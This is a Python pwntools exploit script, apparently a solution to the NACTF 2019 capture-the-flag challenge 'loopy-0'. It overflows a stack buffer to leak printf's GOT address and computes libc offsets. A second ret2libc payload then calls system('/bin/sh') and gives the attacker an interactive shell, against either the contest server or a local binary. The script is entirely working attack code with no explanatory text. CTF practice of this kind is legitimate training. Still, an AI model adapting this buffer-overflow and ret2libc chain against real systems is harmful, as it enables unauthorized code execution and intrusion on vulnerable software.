#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
context.update(arch="i386", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/nactf/pwn/loopy0/loopy-0")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = ['* 0x080491bb']
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    printf_plt = 0x08049030
    printf_got = 0x0804c00c
    main       = 0x080491e7
    libc = ELF("libc.so.6")

    off = 76
    p = "A" * off
    p += p32(printf_plt)
    p += p32(main)
    p += p32(printf_got)
    r.sendlineafter(">",p)
    r.recvuntil(p32(printf_got))
    leak = u32(str(r.recv(4)))
    leak2 = u32(r.recv(4))
    log.info("leaked : " + hex(leak))
    log.info("leakd2 : " + hex(leak2))

    libc_base = leak - libc.symbols['printf']
    libc_sys  = libc_base + libc.symbols['system']
    binsh     = libc_base + libc.search("/bin/sh").next()

    log.info("system()  : " + hex(libc_sys))
    log.info("libc_base : " + hex(libc_base))
    log.info("/bin/sh   : " + hex(binsh))

    q = "A" * off
    q += p32(libc_sys)
    q += p32(main)
    q += p32(binsh)
    r.sendline(q)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("shell.2019.nactf.com", 31283)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
